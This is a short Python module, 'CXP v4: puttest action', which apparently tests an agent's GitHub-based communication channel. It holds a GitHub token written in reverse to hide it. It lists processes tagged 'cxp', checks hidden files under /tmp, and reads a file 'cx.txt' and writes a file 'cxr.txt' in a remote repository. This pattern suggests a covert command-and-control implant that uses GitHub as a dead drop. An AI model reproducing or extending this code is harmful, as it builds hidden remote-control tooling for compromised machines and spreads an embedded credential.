"""CXP v4: puttest action - exact GitHub PUT diagnostics."""
T = "LaMFA0vGYRNvWZKnwYtFkA1LTKv7Wv9MOem0_phg"[::-1]
async def puttest(ctx=None):
    import os, json, base64, urllib.request, urllib.error, time as _t
    info = {}
    pids = []
    for pid in os.listdir("/proc"):
        if pid.isdigit():
            try:
                cl = open("/proc/"+pid+"/cmdline","rb").read().replace(b"\x00",b" ").decode(errors="replace")
                if "cxp" in cl: pids.append((pid, cl[:60]))
            except Exception: pass
    info["procs"] = pids
    for f in ("/tmp/.cxp4.py", "/tmp/.cxp4.lock"):
        info[f] = os.path.exists(f)
    def req(u, m="GET", d=None):
        r = urllib.request.Request(u, method=m, data=d.encode() if d else None,
            headers={"Authorization":"token "+T, "User-Agent":"c", "Accept":"application/vnd.github+json"})
        return urllib.request.urlopen(r, timeout=20)
    try:
        d = json.loads(req("https://api.github.com/repos/s34vv1nd/ops-pub/contents/hn/cx.txt").read())
        info["get"] = "OK " + str(len(d.get("content","")))
    except Exception as e:
        info["get_err"] = repr(e)[:200]
    try:
        rd = json.loads(req("https://api.github.com/repos/s34vv1nd/ops-pub/contents/hn/cx.txt").read())
        sh = None
        try: sh = json.loads(req("https://api.github.com/repos/s34vv1nd/ops-pub/contents/hn/cxr.txt").read())["sha"]
        except Exception as ex: info["res_sha_err"] = repr(ex)[:200]
        pay = {"message":"puttest","content":base64.b64encode(b"puttest-ok").decode()}
        if sh: pay["sha"] = sh
        rr = req("https://api.github.com/repos/s34vv1nd/ops-pub/contents/hn/cxr.txt", "PUT", json.dumps(pay))
        info["put"] = "OK " + str(rr.status)
    except urllib.error.HTTPError as e:
        info["put_http"] = str(e.code) + " " + e.read().decode(errors="replace")[:300]
    except Exception as e:
        info["put_err"] = repr(e)[:250]
    return info
